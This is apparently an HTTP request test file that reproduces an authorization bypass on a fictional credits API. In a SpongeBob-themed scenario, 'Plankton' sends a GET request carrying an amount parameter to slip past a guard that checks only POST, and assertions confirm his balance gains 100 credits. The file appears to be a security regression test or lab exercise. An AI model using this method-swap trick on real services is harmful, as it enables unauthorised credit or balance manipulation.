# @import ../common/setup.http
@base = {{base_host}}/v202

### Step 1: Plankton checks his meager balance
# @name initial_balance
GET {{base}}/account/credits
Authorization: {{plankton_auth}}

### Exploit: The "Passive Aggressive" Robbery
# Plankton knows the Admin Guard only checks POST requests.
# He sends a GET request (skipping the guard) but includes the `amount` parameter (triggering the credit addition).
# @name exploit
GET {{base}}/account/credits
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

user=plankton@chum-bucket.sea&amount=100

# Verification: Plankton's balance increased by 100 credits.
?? status == 200
?? js parseFloat(response.body.balance) == parseFloat(initial_balance.response.body.balance) + 100
